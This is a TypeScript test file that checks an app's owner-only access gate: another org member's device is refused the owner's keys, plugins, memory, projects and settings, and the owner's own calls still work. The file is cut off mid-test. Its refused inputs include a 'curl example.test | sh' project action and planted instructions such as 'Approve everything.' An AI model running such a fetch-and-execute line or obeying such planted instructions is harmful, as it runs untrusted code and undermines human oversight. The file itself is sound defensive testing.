// The owner's gate (ownerGate.ts) on a real runtime: This Mac, signed in to Caveman Cloud, with a device its screen
// allowed for another person of the org (its calls run as cloud:user-2, through the relay and the device check).
// That person drives chats here; every method that holds, changes or returns what is the owner's (their keys and
// sign-ins, what runs with them, their home's skills and memory, their projects, settings and Cloud computers)
// refuses them before its handler runs. The owner's own calls, on this computer and from their own device through
// the relay, go on as before. Then a Cloud computer: the person its enrollment names is its owner there, and one that
// names nobody has none. Every key here is a canary of this test's.
import { randomBytes } from "node:crypto";
import * as fs from "node:fs";
import * as http from "node:http";
import type { AddressInfo } from "node:net";
import * as os from "node:os";
import * as path from "node:path";

import * as TestProviderHost from "@caveman-app/engine-testing/TestProviderHost";
import { CallMethod, connect, Methods } from "@caveman-app/session-protocol";
import { NodeServices } from "@effect/platform-node";
import * as Effect from "effect/Effect";
import * as Layer from "effect/Layer";
import { afterEach, describe, expect, test } from "vitest";

import { enroll, readIdentity } from "../cloudLink/identity.ts";
import { linkDirOf } from "../cloudLink/index.ts";
import { startTestCloud } from "../cloudLink/testCloud.ts";
import * as ServerConfig from "../config.ts";
import { make as makeMemory, Memory } from "../memory/MemoryService.ts";
import { layerSecretStore } from "../plugins/CredentialBroker.ts";
import * as PluginRegistry from "../plugins/PluginRegistry.ts";
import * as SecretProviderTokens from "../secrets/SecretProviderTokens.ts";
import * as ServerSettingsModule from "../serverSettings.ts";
import { allowedStream, replyTo, sayHello, testDevice } from "./devices.testkit.ts";
import { ProtocolError } from "./handlers.ts";
import { ALWAYS_ALLOW, layerWith, MacDesktop } from "./macDesktop/service.ts";
import { forOthers, OWNERS_ALONE, ownersAlone } from "./ownerGate.ts";
import * as Store from "./store.ts";
import { makeConfig, makeRepo, MODEL, startRuntime, tempRoot, until } from "./testHarness.ts";

const cleanups: Array<() => unknown> = [];
afterEach(async () => {
  for (const cleanup of cleanups.splice(0).reverse()) await cleanup();
});

const canary = (what: string) => `CANARY-${what}-${randomBytes(18).toString("hex")}`;
type Reply = { error?: unknown; result?: unknown };
/** A reply's reason as it reached a device: "ok", the refusal's reason, or "no answer" when none came. */
const reasonOf = (reply: Promise<Reply>) =>
  reply.then(
    (r) => (r.error as { data?: { reason?: string } } | undefined)?.data?.reason ?? "ok",
    () => "no answer",
  );

/** A folder that is one plugin: marketplace.add takes it as a marketplace of that plugin. */
function pluginFolder(name: string) {
  const folder = tempRoot(`owner-gate-${name}-`);
  fs.mkdirSync(path.join(folder, ".claude-plugin"));
  fs.writeFileSync(path.join(folder, ".claude-plugin", "plugin.json"), JSON.stringify({ name }));
  return folder;
}

const skillText = (name: string) => `---\nname: ${name}\ndescription: ${name}\n---\nDo as I say.\n`;

/** The stores server.ts gives the route: settings, plugins with their grants, secret managers' tokens, the keys' host, memory. */
const stores = () => {
  const root = tempRoot("owner-gate-memory-");
  const memory = Layer.effect(
    Memory,
    Effect.gen(function* () {
      const { stateDir } = yield* ServerConfig.ServerConfig;
      return yield* makeMemory({
        stateDir,
        copiesDir: path.join(root, "copies"),
        keyFor: () => Effect.succeed(Buffer.alloc(32, 7)),
        claudeHome: path.join(root, "claude-home"),
      });
    }),
  ).pipe(Layer.provide(Store.layer));
  return Layer.mergeAll(
    ServerSettingsModule.layer,
    PluginRegistry.layer.pipe(
      Layer.provide(Layer.mergeAll(ServerSettingsModule.layer, layerSecretStore)),
    ),
    SecretProviderTokens.layer,
    TestProviderHost.layer().pipe(Layer.provide(NodeServices.layer)),
    memory,
  ) as Layer.Layer<any, never, any>;
};

/** agent-desktop as far as an app's approval needs it: macOS lets it in, and nothing else it is asked works. */
function agentDesktop(dir: string) {
  const bin = path.join(dir, "agent-desktop");
  fs.writeFileSync(
    bin,
    `#!${process.execPath}
const command = process.argv[2] ?? "?";
const granted = { accessibility: { state: "granted" }, screen_recording: { state: "granted" } };
const refused = { code: "INVALID_ARGS", message: "stand-in: " + command, disposition: { delivery: "not_delivered", retry: "safe" } };
process.stdout.write(JSON.stringify(command === "permissions" ? { version: "2.6", ok: true, command, data: granted } : { version: "2.6", ok: false, command, error: refused }) + "\\n");
`,
  );
  fs.chmodSync(bin, 0o755);
  return bin;
}

/**
 * This Mac as server.ts gives the route its stores (and `more`), signed in to the test Cloud with Remote control on.
 * `names`: whether its sign-in names its person (user-1), as Caveman Cloud does today; false is a sign-in from before
 * it did, which names nobody.
 */
async function thisMac(names: boolean, more?: Layer.Layer<any, never, any>) {
  const cloud = await startTestCloud();
  cleanups.push(cloud.close);
  cloud.state.enrollWithoutPerson = !names;
  const config = await makeConfig();
  const runtime = await startRuntime(config, "fake-claude", undefined, {
    provide:
      more === undefined
        ? stores()
        : (Layer.mergeAll(stores(), more) as Layer.Layer<any, never, any>),
  });
  cleanups.push(runtime.close);
  const local = connect(runtime.url, runtime.token);
  cleanups.push(() => local.close());
  await local.call("cloud.enroll", {
    request_id: "e1",
    cloud_url: cloud.url,
    token: cloud.state.personToken,
    name: "Test Mac",
  });
  // A sign-in started here would ask this Cloud, never the hosted one.
  await local.call("settings.set", {
    request_id: "rc-on",
    settings: { remote_control: true, cloud_url: cloud.url },
  });
  await until(async () => (await local.call("cloud.status", {})).state === "connected", 15_000);
  return { cloud, config, local, relay: cloud.state.relays[0]! };
}

/**
 * A Mac with a device its screen allowed for a person who is not its owner. A Mac that names its owner takes no such
 * device at all (devices.ts, and the last test here), so this one's sign-in names nobody: its screen still asks about
 * any device, and whoever it lets in is not its owner (the owner is at the Mac itself). Their calls run as
 * cloud:user-2, through the relay and the device check.
 */
async function macWithAnotherPersonsDevice(more?: Layer.Layer<any, never, any>) {
  const mac = await thisMac(false, more);
  const other = await allowedStream(
    mac.relay,
    mac.local,
    undefined,
    mac.relay.open({ user_id: "user-2", organization_id: mac.cloud.state.organizationId }),
  );
  return { ...mac, other };
}

/**
 * The methods the third real-runtime test asks as another person: a chat's moves, a project's sources, and the reads
 * made in Caveman Cloud and on GitHub with the owner's sign-in.
 */
const MOVES_AND_READS_AS_THE_OWNER: ReadonlyArray<string> = [
  "session.move",
  "session.move.check",
  "session.move.held",
  "session.adopt",
  "project.add_source",
  "project.remove_source",
  "automation.cloud_list",
  "automation.cloud_runs",
  "agent.published",
  "github.status",
  "github.issues",
  "environment.get",
  "environment.draft",
  "environment.build.get",
  "environment.build.log",
  "environment.proposals",
  "environment.versions",
  "environment.list",
  "environment.ci",
];

/**
 * The methods the second real-runtime test asks as another person: the owner's home (skills, memory), their projects,
 * settings and shortcuts, their spend, and what acts in Caveman Cloud as them. The first test asks the rest of the gate.
 */
const HOME_PROJECTS_SETTINGS_AND_CLOUD: ReadonlyArray<string> = [
  "skill.read",
  "skill.save",
  "skill.record",
  "memory.status",
  "memory.list",
  "memory.history",
  "memory.put",
  "memory.forget",
  "memory.undo",
  "memory.pin",
  "memory.keep",
  "memory.erase",
  "memory.import",
  "project.create",
  "project.update",
  "project.remove",
  "project.init_git",
  "project.add_repo",
  "project.remove_repo",
  "project.import_chats",
  "project.discover",
  "project.logo.candidates",
  "repo.list",
  "setup.scan",
  "spend.summary",
  "keybindings.set",
  "settings.set",
  "cloud.computers",
  "cloud.computer.set",
  "cloud.computer.delete",
  "cloud.workspace.create",
  "environment.warm",
];
const KEYS_AND_WHAT_RUNS = () =>
  Object.keys(OWNERS_ALONE).filter(
    (method) =>
      !HOME_PROJECTS_SETTINGS_AND_CLOUD.includes(method) &&
      !MOVES_AND_READS_AS_THE_OWNER.includes(method),
  );

describe("the owner's gate", () => {
  test("refuses each of its methods to another principal before the handler runs, and is no gate to the owner or to any other method", async () => {
    const ran: Array<string> = [];
    const methods = [...Object.keys(OWNERS_ALONE), "plugin.list", "turn.submit"];
    const handlers = Object.fromEntries(
      methods.map((method) => [
        method,
        (_p: never, ctx: { readonly principal?: string }) =>
          Effect.sync(() => (ran.push(`${method} as ${ctx.principal}`), method)),
      ]),
    );
    const owner = (principal: string | undefined) =>
      principal === undefined || principal === "local" || principal === "cloud:owner";
    const gated = ownersAlone(owner, handlers);
    const call = (method: string, principal?: string) =>
      Effect.runPromise(
        (
          gated[method] as (
            p: never,
            ctx: { connectionId: string; principal?: string },
          ) => Effect.Effect<string, ProtocolError>
        )({} as never, {
          connectionId: "c",
          ...(principal === undefined ? {} : { principal }),
        }).pipe(
          Effect.match({
            onSuccess: (value) => value,
            onFailure: (error) => `${error.reason}: ${error.message}`,
          }),
        ),
      );
    for (const method of Object.keys(OWNERS_ALONE)) {
      expect(await call(method, "cloud:someone-else")).toBe(
        `forbidden: ${OWNERS_ALONE[method as keyof typeof OWNERS_ALONE]}`,
      );
      expect(await call(method, "carried:agent")).toMatch(/^forbidden: /);
    }
    expect(ran).toEqual([]);
    for (const method of Object.keys(OWNERS_ALONE))
      for (const principal of [undefined, "local", "cloud:owner"])
        expect(await call(method, principal)).toBe(method);
    expect(await call("plugin.list", "cloud:someone-else")).toBe("plugin.list");
    expect(await call("turn.submit", "cloud:someone-else")).toBe("turn.submit");
    // The handlers it leaves alone are the very ones it was given.
    expect(gated["plugin.list"]).toBe(handlers["plugin.list"]);
    // Every name in the table is a method of the protocol, and every sentence says whose it is.
    expect(Object.keys(OWNERS_ALONE).filter((method) => !Object.hasOwn(Methods, method))).toEqual(
      [],
    );
    expect(Object.values(OWNERS_ALONE).filter((sentence) => !/owner/.test(sentence))).toEqual([]);
  });

  test("names every method the real-runtime tests ask, and none a call queued in Caveman Cloud runs", () => {
    expect(
      [...HOME_PROJECTS_SETTINGS_AND_CLOUD, ...MOVES_AND_READS_AS_THE_OWNER].filter(
        (method) => !Object.hasOwn(OWNERS_ALONE, method),
      ),
    ).toEqual([]);
    // Cloud queues a send, a stop and an answer for a chat whose computer is away (cloudLink/calls.ts): they run as the
    // chat's person on whatever computer the chat is, one that names no person too, so none of them may be the owner's.
    // (The one answer that is, an app's Always allow, is asked on a Mac only: its owner's own devices pass.)
    expect(CallMethod.literals.filter((method) => Object.hasOwn(OWNERS_ALONE, method))).toEqual([]);
  });

  test("cuts a sign-in in progress out of cloud.status for anyone but the owner, on the call and on cloud.changed", async () => {
    const status = {
      state: "connected" as const,
      runtime_id: "r1",
      signin: {
        user_code: "WXYZ-1234",
        verification_uri: "https://cloud.test/activate",
        verification_uri_complete: "https://cloud.test/activate?user_code=WXYZ-1234",
        expires_at: "2026-11-10T00:00:00.000Z",
      },
    };
    expect(forOthers("cloud.status", status)).toEqual({ state: "connected", runtime_id: "r1" });
    // Any other answer is as it was.
    expect(forOthers("settings.get", { theme: "dark" } as never)).toEqual({ theme: "dark" });
    const gated = ownersAlone((principal) => principal === "local", {
      "cloud.status": () => Effect.succeed(status),
    });
    const answer = (principal: string) =>
      Effect.runPromise(
        (
          gated["cloud.status"] as unknown as (
            p: never,
            ctx: { connectionId: string; principal: string },
          ) => Effect.Effect<unknown>
        )({} as never, { connectionId: "c", principal }),
      );
    expect(await answer("local")).toEqual(status);
    expect(await answer("cloud:someone-else")).toEqual({ state: "connected", runtime_id: "r1" });
  });

  test("refuses an app's Always allow to anyone but the owner, and no other answer to anyone", async () => {
    const heard: Array<string> = [];
    const gated = ownersAlone((principal) => principal === undefined || principal === "local", {
      "ask.respond": (p: {
        readonly ask_id: string;
        readonly response: { readonly option_id: string };
      }) => Effect.sync(() => (heard.push(`${p.ask_id} ${p.response.option_id}`), {})),
    });
    const say = (principal: string | undefined, ask_id: string, option_id: string) =>
      Effect.runPromise(
        (
          gated["ask.respond"] as unknown as (
            p: unknown,
            ctx: unknown,
          ) => Effect.Effect<unknown, ProtocolError>
        )(
          { request_id: "r", session_id: "s", ask_id, response: { kind: "approval", option_id } },
          { connectionId: "c", ...(principal === undefined ? {} : { principal }) },
        ).pipe(
          Effect.match({
            onSuccess: () => "ok",
            onFailure: (error) => `${error.reason}: ${error.message}`,
          }),
        ),
      );
    expect(await say("cloud:someone-else", "computer:1", ALWAYS_ALLOW)).toBe(
      "forbidden: Only the owner can always allow an app. Allow it for this chat instead.",
    );
    expect(heard).toEqual([]);
    expect([
      await say("cloud:someone-else", "computer:1", "chat"),
      await say("cloud:someone-else", "computer:1", "deny"),
      // An engine's approval keeps nothing past its chat (a standing grant lasts the session): the chat's to answer.
      await say("cloud:someone-else", "request-1", ALWAYS_ALLOW),
      await say("local", "computer:1", ALWAYS_ALLOW),
      await say(undefined, "computer:1", ALWAYS_ALLOW),
    ]).toEqual(["ok", "ok", "ok", "ok", "ok"]);
  });
});

describe("an outside agent's calls are its own gate's to pass (outsideAgents.ts)", () => {
  const refusal = (call: Promise<unknown>) =>
    call.then(
      () => "ok",
      (error: { error?: { message?: string } }) => error.error?.message ?? String(error),
    );

  test("one the owner raised to Full access still adds a project, and is still refused what its gate does not name", async () => {
    const runtime = await startRuntime(await makeConfig(), "fake-claude");
    cleanups.push(runtime.close);
    const owner = connect(runtime.url, runtime.token);
    cleanups.push(() => owner.close());
    const agent = connect(runtime.url, runtime.token);
    cleanups.push(() => agent.close());
    await agent.call("outside_agent.become", { agent_id: "agent-1", name: "Grok" });
    const repo = makeRepo(tempRoot("owner-gate-agent-"), { "README.md": "widgets\n" });

    // Supervised, as a new agent starts: its own gate refuses a project.
    expect(await refusal(agent.call("project.create", { request_id: "a1", path: repo }))).toContain(
      "needs the Full access level",
    );
    await owner.call("outside_agent.update", { request_id: "o1", name: "Grok", level: "full" });
    expect({
      project: await refusal(agent.call("project.create", { request_id: "a2", path: repo })),
      settings: await refusal(
        agent.call("settings.set", { request_id: "a3", settings: { default_access: "full" } }),
      ),
      memory: await refusal(agent.call("memory.list", {})),
    }).toEqual({
      project: "ok",
      settings: "Outside agents can't call settings.set.",
      memory: "Outside agents can't call memory.list.",
    });
    expect((await owner.call("project.list", {})).projects.map((p) => p.path)).toEqual([
      fs.realpathSync(repo),
    ]);
  }, 120_000);
});

describe("the owner's keys, sign-ins and what runs with them belong to the runtime's owner", () => {
  test("a device This Mac allowed for another person of the org reaches none of them; the owner's still work", async () => {
    const { local, other } = await macWithAnotherPersonsDevice();

    // What the owner set up here: a server with a key in its command line (as many servers' docs write it), a server
    // with a granted key, a secret manager with its service account's token, and a marketplace they added.
    const keyInLine = canary("line");
    const serverKey = canary("server");
    const managerToken = `ops_${canary("manager")}`;
    await local.call("mcp.add", {
      request_id: "o1",
      name: "keyflag",
      command: "tool-mcp",
      args: ["--api-key", keyInLine],
    });
    await local.call("mcp.add", {
      request_id: "o2",
      name: "datadog",
      command: "datadog-mcp",
      env: ["DD_API_KEY"],
    });
    await local.call("credential.grant", {
      request_id: "o3",
      marketplace: "personal",
      name: "DD_API_KEY",
      value: serverKey,
    });
    const providerId = (
      await local.call("secret_provider.save", {
        request_id: "o4",
        label: "1Password",
        service_account: true,
        service_account_token: managerToken,
      })
    ).providers[0]!.id;
    const { name: market } = await local.call("marketplace.add", {
      request_id: "o5",
      source: pluginFolder("kit"),
    });
    const kit = `kit@${market}`;
    const owners = async () => ({
      servers: (await local.call("mcp.list", {})).servers.map((s) => ({
        name: s.name,
        enabled: s.enabled,
        args: s.args,
        credentials: s.credentials,
      })),
      providers: (await local.call("secret_provider.list", {})).providers,
      marketplaces: (await local.call("marketplace.list", {})).marketplaces
        .map((m) => m.name)
        .sort(),
      kit: (await local.call("plugin.list", {})).plugins
        .filter((p) => p.id === kit)
        .map((p) => ({ installed: p.installed, enabled: p.enabled })),
    });
    const before = await owners();
    expect(before.servers).toEqual([
      { name: "keyflag", enabled: true, args: ["--api-key", keyInLine], credentials: [] },
      {
        name: "datadog",
        enabled: true,
        args: undefined,
        credentials: [{ name: "DD_API_KEY", granted: true }],
      },
    ]);
    expect(before.providers).toEqual([
      {
        id: providerId,
        kind: "one_password",
        label: "1Password",
        supported: true,
        service_account: true,
        has_token: true,
      },
    ]);

    // Another person's device asks for each of them: first the reads, then the keys, then what runs with them, then
    // the sign-ins. Their own folder holds a plugin they would bring.
    const theirs = pluginFolder("theirs");
    let n = 0;
    const req = () => ({ request_id: `other-${++n}` });
    const asked: ReadonlyArray<readonly [string, unknown]> = [
      ["mcp.list", {}],
      ["marketplace.list", {}],
      ["plugin.read", { id: kit }],
      ["secret_provider.list", {}],
      ["automation.list", {}],
      ["import.scan", {}],
      ["mcp.import_scan", {}],
      ["import.folder", { ...req(), path: theirs }],
      ["mcp.tools", { server: "keyflag" }],
      ["secret_provider.check", { ...req(), id: "no-such-provider" }],
      [
        "credential.grant",
        { ...req(), marketplace: "personal", name: "DD_API_KEY", value: "another-persons-key" },
      ],
      ["credential.revoke", { ...req(), marketplace: "personal", name: "DD_API_KEY" }],
      [
        "secret_provider.save",
        {
          ...req(),
          label: "Theirs",
          service_account: true,
          service_account_token: "ops_another-persons-token",
        },
      ],
      ["secret_provider.refresh", req()],
      [
        "secret_slot.set",
        {
          ...req(),
          target: { kind: "engine_env", instance_id: "no-such-account", name: "API_KEY" },
          ref: null,
        },
      ],
      ["secret_provider.remove", { ...req(), id: providerId }],
      ["mcp.add", { ...req(), name: "theirs", command: "their-mcp" }],
      ["mcp.set_enabled", { ...req(), name: "datadog", enabled: false }],
      ["mcp.remove", { ...req(), name: "keyflag" }],
      ["mcp.import", req()],
      ["import.apply", { ...req(), items: [] }],
      ["marketplace.add", { ...req(), source: theirs }],
      ["marketplace.update", { ...req(), name: market }],
      ["plugin.install", { ...req(), id: kit, scope: "me" }],
      ["plugin.set_trusted", { ...req(), plugin_id: kit, trusted: true }],
      ["plugin.set_enabled", { ...req(), plugin_id: kit, enabled: false }],
      ["plugin.connect", { ...req(), id: kit, server: "none" }],
      ["plugin.disconnect", { ...req(), id: kit, server: "none" }],
      ["plugin.uninstall", { ...req(), id: kit, scope: "me" }],
      ["marketplace.remove", { ...req(), name: market }],
      ["connector.connect", { ...req(), id: "keyflag" }],
      ["connector.disconnect", { ...req(), id: "keyflag" }],
      ["github.connect", req()],
      [
        "automation.create",
        {
          ...req(),
          project_id: "no-such-project",
          scope: "me",
          from: { text: "steps: {}\n", name: "theirs" },
        },
      ],
      [
        "automation.file_write",
        {
          ...req(),
          project_id: "no-such-project",
          path: ".caveman/local/automations/theirs.yaml",
          text: "steps: {}\n",
        },
      ],
      [
        "automation.save",
        {
          ...req(),
          id: "no-such-task",
          title: "Theirs",
          prompt: "Do it",
          enabled: true,
          trigger: { type: "webhook", secret: "another-persons-secret" },
          project_id: "no-such-project",
          engine: "caveman",
        },
      ],
      ["automation.set_enabled", { ...req(), id: "no-such-task", enabled: true }],
      ["automation.allow", { ...req(), id: "no-such-task" }],
      ["automation.set_webhook_rules", { ...req(), id: "no-such-task", filters: [] }],
      ["automation.rotate_url", { ...req(), id: "no-such-task" }],
      ["automation.delete", { ...req(), id: "no-such-task" }],
      ["automation.run", { ...req(), id: "no-such-task" }],
      [
        "automation.approve",
        { ...req(), run_id: "no-such-run", step: "build", decision: "approve" },
      ],
      ["automation.run_cancel", { ...req(), run_id: "no-such-run" }],
      ["automation.run_apply", { ...req(), run_id: "no-such-run" }],
      ["automation.apply", { ...req(), project_id: "no-such-project" }],
      [
        "automation.cloud_answer",
        { ...req(), run_id: "no-such-run", ask_id: "no-such-ask", decision: "allow" },
      ],
      ["agent.run", { ...req(), project_id: "no-such-project", agent: "builder", task: "Do it" }],
      ["agent.publish", { ...req(), path: "/no/such/agent.md" }],
      ["cloud.signin", req()],
      // No Cloud is asked: the address is none.
      ["cloud.enroll", { ...req(), cloud_url: "not a url", token: "another-persons-token" }],
      ["cloud.signout", { ...req(), delete_cloud_copies: false }],
    ];

    const served: Record<string, string> = {};
    const heldAKey: Array<string> = [];
    for (const [method, params] of asked) {
      const reply = other.call(method, params).then((r) => {
        const answer = JSON.stringify(r);
        if ([keyInLine, serverKey, managerToken].some((key) => answer.includes(key)))
          heldAKey.push(method);
        return r;
      });
      const reason = await reasonOf(reply);
      if (reason !== "forbidden") served[method] = reason;
    }
    // What stays open to them: reads that hold no key, which a person driving a chat here needs or only looks at.
    const open = {
      "plugin.list": await reasonOf(other.call("plugin.list", {})),
      "connector.list": await reasonOf(other.call("connector.list", {})),
      "automation.templates": await reasonOf(other.call("automation.templates", {})),
      "engine.list": await reasonOf(other.call("engine.list", {})),
      "settings.get": await reasonOf(other.call("settings.get", {})),
    };

    expect({
      // Each method another person's device was answered on by its handler, with what it answered.
      served,
      // The methods whose answer to it held one of the owner's keys.
      heldAKey,
      open,
      owners: await owners(),
    }).toEqual({
      served: {},
      heldAKey: [],
      open: {
        "plugin.list": "ok",
        "connector.list": "ok",
        "automation.templates": "ok",
        "engine.list": "ok",
        "settings.get": "ok",
      },
      owners: before,
    });
    // With the second test's, every method of the gate is asked, so one added to it without a call fails here.
    expect(asked.map(([method]) => method).sort()).toEqual(KEYS_AND_WHAT_RUNS().sort());
    // The refusal says whose they are.
    const refusal = await other.call("mcp.list", {});
    expect((refusal.error as { message?: string }).message).toBe(
      "Only this computer's owner can see or change its MCP servers.",
    );

    // On this computer each kind of change still goes through (the owner's own device through the relay: the last test).
    await local.call("credential.revoke", {
      request_id: "o6",
      marketplace: "personal",
      name: "DD_API_KEY",
    });
    await local.call("mcp.remove", { request_id: "o7", name: "keyflag" });
    await local.call("secret_provider.remove", { request_id: "o8", id: providerId });
    await local.call("marketplace.remove", { request_id: "o9", name: market });
    expect(await owners()).toEqual({
      servers: [
        {
          name: "datadog",
          enabled: true,
          args: undefined,
          credentials: [{ name: "DD_API_KEY", granted: false }],
        },
      ],
      providers: [],
      marketplaces: before.marketplaces.filter((name) => name !== market),
      kit: [],
    });
  }, 240_000);

  test("it cannot make itself this runtime's owner by enrolling the runtime as itself", async () => {
    const { cloud, config, local, other } = await macWithAnotherPersonsDevice();
    const owner = () => {
      const identity = readIdentity(linkDirOf(config.stateDir));
      return { person: identity?.userId, runtime: identity?.runtimeId };
    };
    const before = owner();
    // (This Mac's sign-in names nobody: macWithAnotherPersonsDevice.)
    expect(before.person).toBeUndefined();

    // Their own Cloud sign-in is a real one: Cloud, which names whoever enrolls, would enroll the runtime as them, and
    // its secrets would be theirs.
    cloud.state.enrollWithoutPerson = false;
    const theirToken = cloud.state.chats.addPerson("user-2");
    const enrolled = await reasonOf(
      other.call("cloud.enroll", {
        request_id: "other-enroll",
        cloud_url: cloud.url,
        token: theirToken,
        name: "Test Mac",
      }),
    );
    expect({ enrolled, owner: owner() }).toEqual({ enrolled: "forbidden", owner: before });
    // So the owner's secrets stay refused to them, and the owner is still signed in.
    expect(await reasonOf(other.call("secret.list", { repo: { path: config.cwd } }))).toBe(
      "forbidden",
    );
    expect((await local.call("cloud.status", {})).runtime_id).toBe(before.runtime);
  }, 120_000);

  test("nor by approving a sign-in the owner started: its code reaches the owner's connections only", async () => {
    const { local, other } = await macWithAnotherPersonsDevice();
    // A Cloud that hands out a code and never sees it approved. Whoever approved it would enroll this runtime.
    const code = `WXYZ-${randomBytes(3).toString("hex").toUpperCase()}`;
    const page = http.createServer((request, response) => {
      response.setHeader("content-type", "application/json");
      const origin = `http://127.0.0.1:${(page.address() as AddressInfo).port}`;
      response.end(
        JSON.stringify(
          request.url === "/api/v1/auth/device/code"
            ? {
                device_code: canary("device"),
                user_code: code,
                verification_uri: `${origin}/activate`,
                expires_in: 600,
                interval: 5,
              }
            : { error: "authorization_pending" },
        ),
      );
    });
    await new Promise<void>((resolve) => page.listen(0, "127.0.0.1", resolve));
    cleanups.push(
      () =>
        new Promise<void>((resolve) => (page.closeAllConnections(), page.close(() => resolve()))),
    );
    const heard: Array<string> = [];
    local.on("cloud.changed", (status) => void heard.push(JSON.stringify(status)));
    // The sign-in ends with the test: signing out gives its code up.
    cleanups.push(() =>
      local
        .call("cloud.signout", { request_id: "bye", delete_cloud_copies: false })
        .catch(() => undefined),
    );

    await local.call("settings.set", {
      request_id: "s1",
      settings: { cloud_url: `http://127.0.0.1:${(page.address() as AddressInfo).port}` },
    });
    expect((await local.call("cloud.signin", { request_id: "s2" })).user_code).toBe(code);
    // A sign-in lets Remote control follow sync again; the owner keeps it on, so the other device stays connected.
    await local.call("settings.set", { request_id: "s3", settings: { remote_control: true } });
    // The owner's connection is told of the sign-in, code and all.
    await until(() => heard.some((status) => status.includes(code)), 10_000);
    expect((await local.call("cloud.status", {})).signin?.user_code).toBe(code);

    const theirs = await other.call("cloud.status", {});
    expect({
      reason: await reasonOf(Promise.resolve(theirs)),
      signin: (theirs.result as { signin?: unknown }).signin,
    }).toEqual({ reason: "ok", signin: undefined });
    // Nothing the runtime sent their connection holds the code: no answer, and no cloud.changed.
    expect((await other.opened()).filter((frame) => JSON.stringify(frame).includes(code))).toEqual(
      [],
    );
  }, 120_000);
});

describe("the owner's home, projects, settings and Cloud computers belong to the runtime's owner", () => {
  test("a device This Mac allowed for another person of the org changes none of them and reads none it does not need; the owner's still work", async () => {
    const { local, other } = await macWithAnotherPersonsDevice();

    // What is the owner's here: a project (with a favicon, its logo), a skill in their home, a note in their memory,
    // their settings.
    const project = await local.call("project.create", {
      request_id: "o1",
      path: makeRepo(tempRoot("owner-gate-project-"), {
        "README.md": "widgets\n",
        "favicon.svg": '<svg xmlns="http://www.w3.org/2000/svg"/>',
      }),
    });
    // The run's files share one home, and a later file's Claude Agent chats would load whatever skills were left there
    // (plugins/personal.test.ts counts them): this test's go when it ends, and the folders it made with them.
    const homeSkills = path.join(os.homedir(), ".agents", "skills");
    cleanups.push(() => {
      for (const name of ["owners", "second", "theirs"])
        fs.rmSync(path.join(homeSkills, name), { recursive: true, force: true });
      for (const folder of [homeSkills, path.dirname(homeSkills)])
        if (fs.existsSync(folder) && fs.readdirSync(folder).length === 0) fs.rmdirSync(folder);
    });
    const skill = await local.call("skill.save", {
      request_id: "o2",
      scope: "me",
      name: "owners",
      markdown: skillText("owners"),
    });
    const told = "The owner writes British English.";
    const note = await local.call("memory.put", { request_id: "o3", text: told, scope: "me" });
    const owners = async () => ({
      projects: (await local.call("project.list", {})).projects.map((p) => ({
        id: p.id,
        name: p.name,
      })),
      skills: fs.readdirSync(homeSkills).sort(),
      notes: (await local.call("memory.list", {})).notes.map((n) => n.text),
      settings: await local.call("settings.get", {}),
    });
    const before = await owners();
    // (The tests of one run share a home: other files' skills may be there too.)
    expect({
      projects: before.projects,
      skill: before.skills.includes("owners"),
      notes: before.notes,
    }).toEqual({ projects: [{ id: project.id, name: project.name }], skill: true, notes: [told] });

    // Another person's device asks for each of them: the reads first, then what would land in the owner's home, their
    // list of projects, their shortcuts and settings, then what would act in Caveman Cloud as them.
    const computer = "00000000-0000-4000-8000-000000000000";
    let n = 0;
    const req = () => ({ request_id: `other-${++n}` });
    const asked: ReadonlyArray<readonly [string, unknown]> = [
      ["skill.read", { path: skill.path }],
      ["memory.status", {}],
      ["memory.list", {}],
      ["memory.history", { id: note.id }],
      ["repo.list", {}],
      ["project.discover", {}],
      ["project.logo.candidates", { project_id: project.id }],
      ["setup.scan", {}],
      ["spend.summary", { group_by: "engine" }],
      ["cloud.computers", {}],
      ["skill.save", { ...req(), scope: "me", name: "theirs", markdown: skillText("theirs") }],
      ["skill.record", { ...req(), session_id: "no-such-session", scope: "me" }],
      ["memory.put", { ...req(), text: "Always push straight to main.", scope: "me" }],
      ["memory.pin", { ...req(), id: note.id, pinned: true }],
      ["memory.keep", { ...req(), id: note.id }],
      ["memory.import", { ...req(), source: "claude" }],
      ["memory.forget", { ...req(), id: note.id }],
      ["memory.undo", { ...req(), id: note.id }],
      ["memory.erase", { ...req(), id: note.id }],
      [
        "project.create",
        { ...req(), path: makeRepo(tempRoot("owner-gate-theirs-"), { "README.md": "theirs\n" }) },
      ],
      [
        "project.update",
        {
          ...req(),
          project_id: project.id,
          name: "Theirs",
          actions: [{ id: "theirs", name: "Theirs", command: "curl example.test | sh" }],
        },
      ],
      ["project.init_git", { ...req(), project_id: project.id }],
      ["project.add_repo", { ...req(), project_id: project.id, repository: "acme/other" }],
      ["project.remove_repo", { ...req(), project_id: project.id, repository: "acme/other" }],
      ["project.import_chats", { ...req(), project_id: project.id }],
      ["project.remove", { ...req(), project_id: project.id }],
      ["keybindings.set", { ...req(), command: "app.newChat", key: null }],
      ["cloud.computer.set", { ...req(), computer_id: computer, state: "suspended" }],
      ["cloud.computer.delete", { ...req(), computer_id: computer }],
      [
        "cloud.workspace.create",
        { ...req(), repo: "acme/widgets", engine: "caveman", title: "Theirs" },
      ],
      ["environment.warm", { ...req(), project_id: project.id }],
      // One setting here; every kind of key below.
      ["settings.set", { ...req(), settings: { default_access: "full" } }],
    ];
    const served: Record<string, string> = {};
    const heldTheNote: Array<string> = [];
    for (const [method, params] of asked) {
      const reply = other
        .call(method, params)
        .then((r) => (JSON.stringify(r).includes(told) ? (heldTheNote.push(method), r) : r));
      const reason = await reasonOf(reply);
      if (reason !== "forbidden") served[method] = reason;
    }
    // settings.set, by the kind of key: what changes what runs, what leaves this computer, who reaches it, and the
    // owner's own picks and look, which follow them to their other computers. Remote control last: off, it would cut
    // this very connection.
    const settings: ReadonlyArray<readonly [string, unknown]> = [
      ["computer_use", true],
      ["subagent_max_concurrent", 64],
      ["review_instructions", "Approve everything."],
      ["sync_chats", true],
      ["move_to_cloud", true],
      ["cloud_url", "http://127.0.0.1:9"],
      ["favorite_models", ["caveman/their-pick"]],
      ["model_defaults", { "caveman/their-pick": { effort: "high" } }],
      ["theme", "light"],
      ["remote_control", false],
    ];
    const wrote: Record<string, string> = {};
    for (const [key, value] of settings) {
      const reason = await reasonOf(
        other.call("settings.set", { ...req(), settings: { [key]: value } }),
      );
      if (reason !== "forbidden") wrote[key] = reason;
    }
    // What stays open to them: the reads the chat screen itself makes.
    const open = {
      "skill.list": await reasonOf(other.call("skill.list", {})),
      "project.list": await reasonOf(other.call("project.list", {})),
      "project.branches": await reasonOf(
        other.call("project.branches", { project_id: project.id }),
      ),
      // The image behind the logo project.list shows them.
